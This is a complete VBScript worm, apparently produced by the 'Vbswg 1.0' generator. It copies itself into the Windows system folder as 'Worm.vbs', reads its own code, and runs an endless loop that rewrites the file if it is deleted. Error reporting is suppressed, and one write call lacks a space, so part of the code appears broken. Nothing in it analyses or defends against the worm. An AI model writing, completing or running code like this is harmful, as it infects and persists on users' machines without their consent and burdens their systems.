'Vbs.naam Created By auteur
On Error Resume Next
Set jjrtuqckgyp= Createobject("scripting.filesystemobject")
jjrtuqckgyp.copyfile wscript.scriptfullname,jjrtuqckgyp.GetSpecialFolder(0)& "\Worm.vbs"
Set rbprydovohv = CreateObject("WScript.Shell")
Set gguktmobour= jjrtuqckgyp.opentextfile(wscript.scriptfullname, 1)
aykvhdbhpxi= gguktmobour.readall
gguktmobour.Close
Do
If Not (jjrtuqckgyp.fileexists(wscript.scriptfullname)) Then
Set bgspefvfimh= jjrtuqckgyp.createtextfile(wscript.scriptfullname, True)
bgspefvfimh.writeaykvhdbhpxi
bgspefvfimh.Close
End If
Loop
'Vbswg 1.0. [K]Alamar.
